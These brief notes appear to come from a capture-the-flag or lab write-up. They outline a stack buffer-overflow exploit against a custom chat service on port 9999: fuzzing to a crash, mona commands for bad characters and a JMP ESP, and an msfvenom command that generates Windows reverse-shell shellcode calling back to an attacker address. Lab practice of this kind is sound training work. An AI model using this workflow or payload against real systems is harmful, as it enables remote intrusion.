##

* 3 services are running 
- FTP
- custom service at 9999

* FTP 
- run in binary mode
- download chatserver and dll file

* run fuzzer.py
* crashed at 2100 bytes
# !mona config -set workingfolder c:\mona\%p
# !mona bytearray -b "\x00"
# !mona compare -f C:\mona\chatserver\bytearray.bin -a 00fceea8
# !mona jmp -r esp -cpb "\x00"
# msfvenom -p windows/shell_reverse_tcp LHOST="10.10.172.192" LPORT=4444 EXITFUNC=thread -b "\x00" -f c

